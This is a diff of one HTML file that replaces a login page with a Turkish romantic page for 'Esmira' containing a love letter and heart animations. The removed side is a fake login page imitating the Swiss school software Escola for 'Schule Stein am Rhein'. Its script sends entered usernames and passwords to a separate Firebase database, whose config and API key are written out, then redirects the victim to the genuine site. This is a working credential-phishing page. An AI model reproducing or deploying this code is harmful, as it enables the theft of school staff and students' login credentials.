@@ -1,253 +1,206 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Escola - Login</title>
-
-  <link href="inc/font/nunito/nunito.css" rel="stylesheet" />
-
-  <style>
-    * { box-sizing: border-box; font-family: 'Nunito', sans-serif; }
-
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: flex;
-      background-color: #E2F3FF;
-      background-image: url("static/login/wave.svg");
-      background-repeat: no-repeat;
-      background-position: bottom;
-      background-size: 100% auto;
-    }
-
-    #login-left-panel {
-      width: 400px;
-      height: 100vh;
-      background: #fff;
-      padding: 32px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      position: fixed;
-    }
-
-    #login-logo-text { font-size: 26px; font-weight: 800; color: #007fe7; }
-    #login-logo-text .brace { color:#007fe7; }
-    #login-logo-text .word { margin: 0 4px; }
-    #login-slogan { font-size: 30px; font-weight: 700; }
-    #login-content { margin-left: 400px; padding: 64px; display: flex; gap: 64px; }
-
-    .login-box { width: 420px; }
-    input { width: 100%; padding: 12px; margin-bottom: 16px; }
-    button { width: 100%; padding: 12px; background: #5aa9e6; color: #fff; border: none; cursor: pointer; }
-
-    #xmas-panel {
-      width: 420px;
-      background: linear-gradient(160deg, #065f46, #0f766e);
-      border-radius: 28px;
-      padding: 40px;
-      color: #fff;
-      position: relative;
-      overflow: hidden;
-    }
-
-    #snow-canvas { position: absolute; inset: 0; pointer-events: none; }
-
-    @media (max-width: 1279px) {
-      #login-left-panel { display: none; }
-      #login-content {
-        margin-left: 0;
-        flex-direction: column;
-        padding: 24px;
-        gap: 24px;
-      }
-      .login-box {
-        width: 100%;
-        max-width: 420px;
-        margin: 0 auto;
-      }
-      #xmas-panel {
-        width: 100%;
-        max-width: 420px;
-        margin: 0 auto;
-      }
-    }
-
-    @media (max-width: 480px) {
-      body { background-size: cover; }
-      h1 { font-size: 22px; text-align: center; }
-      input, button { font-size: 16px; padding: 14px; }
-      #login-content { align-items: center; }
-      .login-box { width: 100%; max-width: 360px; }
-      #xmas-panel {
-        width: 100%;
-        max-width: 360px;
-        padding: 24px;
-        border-radius: 20px;
-      }
-      #xmas-panel h2 { font-size: 20px; text-align: center; }
-    }
-  
-
-    /* Mobile top bar */
-    #mobile-header {
-      display: none;
-      background: #fff;
-      padding: 16px;
-      text-align: center;
-      font-weight: 800;
-      color: #007fe7;
-      font-size: 22px;
-    }
-
-    @media (max-width: 1279px) {
-      #mobile-header { display: block; }
-    }
-    .social {
-      display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-
-    .social a {
-      text-decoration: none;
-      background: #007fe7;
-      color: #fff;
-      padding: 10px 14px;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 14px;
-    }
-
-    .social a:hover {
-      background: #005bb5;
-    }
-
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Esmira 💕</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Great+Vibes&family=Poppins:wght@300;400;500&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #fff0f5 0%, #f8e8ff 100%);
+            color: #5d3a5d;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+        
+        .flower-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.12;
+        }
+        
+        header {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            position: relative;
+        }
+        
+        h1 {
+            font-family: 'Great Vibes', cursive;
+            font-size: 5.8rem;
+            color: #c56a92;
+            margin: 0;
+        }
+        
+        .subtitle {
+            font-size: 1.65rem;
+            color: #7a4a6a;
+            margin-top: 15px;
+            font-weight: 300;
+        }
+        
+        nav {
+            position: fixed;
+            top: 25px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255,255,255,0.9);
+            backdrop-filter: blur(12px);
+            padding: 12px 35px;
+            border-radius: 50px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+            z-index: 1000;
+        }
+        
+        nav a {
+            color: #6b4866;
+            text-decoration: none;
+            margin: 0 18px;
+            font-weight: 500;
+        }
+        
+        section {
+            padding: 110px 8%;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        
+        .section-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.8rem;
+            text-align: center;
+            margin-bottom: 50px;
+            color: #9f5a7f;
+        }
+        
+        .love-letter {
+            background: white;
+            padding: 55px 50px;
+            border-radius: 28px;
+            box-shadow: 0 20px 50px rgba(197, 106, 146, 0.15);
+            line-height: 1.85;
+            font-size: 1.2rem;
+        }
+        
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 20px;
+        }
+        
+        .gallery img {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            border-radius: 18px;
+            transition: 0.4s;
+        }
+        
+        .gallery img:hover {
+            transform: scale(1.06);
+        }
+        
+        footer {
+            text-align: center;
+            padding: 90px 20px 60px;
+            background: linear-gradient(to top, #ffe4f0, transparent);
+        }
+        
+        .heart {
+            animation: pulse 1.8s infinite;
+        }
+    </style>
 </head>
 <body>
+    <div class="flower-bg"></div>
+    
+    <nav>
+        <a href="#anasayfa">Ana Sayfa</a>
+        <a href="#mektup">Bir Şeyler Yazmak İstedim</a>
+        <a href="#anilar">İlk Anılarımız</a>
+    </nav>
+    
+    <header id="anasayfa">
+        <div>
+            <h1>Esmira</h1>
+            <p class="subtitle">Seni tanımaya başladığımdan beri<br>gülümseyerek uyanıyorum ✨</p>
+            <p style="margin-top: 50px; font-size: 2.2rem;">
+                ❤️💕
+            </p>
+        </div>
+    </header>
+    
+    <section id="mektup">
+        <h2 class="section-title">Sana</h2>
+        <div class="love-letter">
+            <p>Merhaba Esmira,</p>
+            <br>
+            <p>Henüz çok yeni sayılırız ama sana bunu söylemek istedim: Seninle vakit geçirmek gerçekten çok güzel hissettiriyor. Konuşurken, gülerken, susarken bile... Hepsi hoşuma gidiyor.</p>
+            <br>
+            <p>Bazen aklıma geliyorsun ve fark etmeden gülümsüyorum. Bu hissin ne kadar güzel olduğunu bilmeni istedim.</p>
+            <br>
+            <p>Şimdi daha yeni başlıyoruz, umarım birlikte çok güzel anılar biriktiririz.</p>
+            <br>
+            <p style="text-align: right; margin-top: 40px;">
+                Seni düşünerek,<br>
+                <strong>Sevgilin</strong>
+            </p>
+        </div>
+    </section>
+    
+    <section id="anilar" style="background: rgba(255,255,255,0.75);">
+        <h2 class="section-title">İlk Anılarımız</h2>
+        <div class="gallery">
+            <img src="https://picsum.photos/id/1015/600/800" alt="Birlikte">
+            <img src="https://picsum.photos/id/1027/600/800" alt="Birlikte">
+            <img src="https://picsum.photos/id/106/600/800" alt="Birlikte">
+            <img src="https://picsum.photos/id/201/600/800" alt="Birlikte">
+        </div>
+        <p style="text-align:center; margin-top: 35px; color:#9f5a7f; font-style:italic;">
+            Buraya birlikte çektiğimiz fotoğrafları koyabilirsin
+        </p>
+    </section>
+    
+    <footer>
+        <p style="font-size: 2rem; font-family: 'Great Vibes', cursive; color: #c56a92;">
+            Seninle her şey daha güzel başlıyor...
+        </p>
+        <p style="margin-top: 25px; font-size: 1.1rem;">💕 Esmira 💕</p>
+    </footer>
 
-  <div id="mobile-header">escola</div>
-
-  <div id="login-left-panel">
-    <div id="login-logo-text"><span class="brace">{</span><span class="word">escola</span><span class="brace">}</span></div>
-    <div id="login-slogan">Webbasierte Software für den Schweizer Schulalltag</div>
-
-    <!-- Social links -->
-    <div class="social">
-      <a href="https://www.facebook.com/escola.ch" target="_blank">Facebook</a>
-      <a href="https://twitter.com/escola_ch" target="_blank">Twitter</a>
-      <a href="https://www.instagram.com/escola.ch" target="_blank">Instagram</a>
-    </div>
-
-    <div>© Escola GmbH</div>
-  </div>
-
-  <div id="login-content">
-    <div class="login-box">
-      <h1>Schule Stein am Rhein</h1>
-      <input id="username" placeholder="Benutzername" />
-      <input id="password" type="password" placeholder="Passwort" />
-      <button id="loginBtn">Anmelden</button>
-    </div>
-
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
-    // Firebase configuration
-    const firebaseConfig = {
-      apiKey: "AIzaSyBpuVs9M1vUhR9OXahdm4vhpZMrKl9KuGI",
-      authDomain: "ertee-fc073.firebaseapp.com",
-      databaseURL: "https://ertee-fc073-default-rtdb.firebaseio.com",
-      projectId: "ertee-fc073",
-      storageBucket: "ertee-fc073.firebasestorage.app",
-      messagingSenderId: "738703331926",
-      appId: "1:738703331926:web:fcb8aaf5b54b9a884c21f7"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const database = getDatabase(app);
-
-    const loginBtn = document.getElementById('loginBtn');
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-
-    // Login handler (NO illegal return outside function)
-    loginBtn.addEventListener('click', () => {
-      const username = usernameInput.value.trim();
-      const password = passwordInput.value.trim();
-
-      if (!username || !password) {
-        alert('Benutzername und Passwort sind erforderlich');
-        return; // valid: inside event callback
-      }
-
-      push(ref(database, 'logins'), {
-        username: username,
-        password: password,
-        school: 'Schule Stein am Rhein',
-        createdAt: new Date().toISOString()
-      })
-      .then(() => {
-        alert('Daten erfolgreich gespeichert ✅');
-        window.location.href = 'https://www.escola.ch/';
-      })
-      .catch(err => {
-        alert('Firebase Fehler ❌: ' + err.message);
-      });
-    });
-
-    // Snow animation (panel only)
-    const canvas = document.getElementById('snow-canvas');
-    const ctx = canvas.getContext('2d');
-    const panel = document.getElementById('xmas-panel');
-
-    const flakes = [];
-
-    function resize() {
-      canvas.width = panel.clientWidth;
-      canvas.height = panel.clientHeight;
-
-      flakes.length = 0;
-      for (let i = 0; i < 180; i++) {
-        flakes.push({
-          x: Math.random() * canvas.width,
-          y: Math.random() * canvas.height,
-          r: Math.random() * 3 + 1,
-          d: Math.random() * 1.2 + 0.3
-        });
-      }
-    }
-
-    resize();
-    window.addEventListener('resize', resize);
-
-    function snow() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = 'rgba(255,255,255,0.9)';
-      ctx.beginPath();
-
-      flakes.forEach(f => {
-        ctx.moveTo(f.x, f.y);
-        ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
-      });
-      ctx.fill();
-
-      flakes.forEach(f => {
-        f.y += f.d;
-        if (f.y > canvas.height) {
-          f.y = -5;
-          f.x = Math.random() * canvas.width;
+    <script>
+        function createHeart() {
+            const heart = document.createElement('div');
+            heart.textContent = ['💕','❤️','✨'][Math.floor(Math.random()*3)];
+            heart.style.position = 'fixed';
+            heart.style.left = Math.random() * 100 + 'vw';
+            heart.style.top = '-40px';
+            heart.style.fontSize = Math.random() * 18 + 22 + 'px';
+            heart.style.opacity = Math.random() * 0.7 + 0.5;
+            heart.style.zIndex = 999;
+            document.body.appendChild(heart);
+            
+            setTimeout(() => {
+                heart.style.transition = 'all 7s linear';
+                heart.style.top = '105vh';
+                heart.style.transform = `rotate(${Math.random()*200 - 50}deg)`;
+            }, 50);
+            
+            setTimeout(() => heart.remove(), 8000);
         }
-      });
-
-      requestAnimationFrame(snow);
-    }
-
-    snow();
-  </script>
-
+        
+        setInterval(() => {
+            if (Math.random() > 0.6) createHeart();
+        }, 700);
+    </script>
 </body>
 </html>
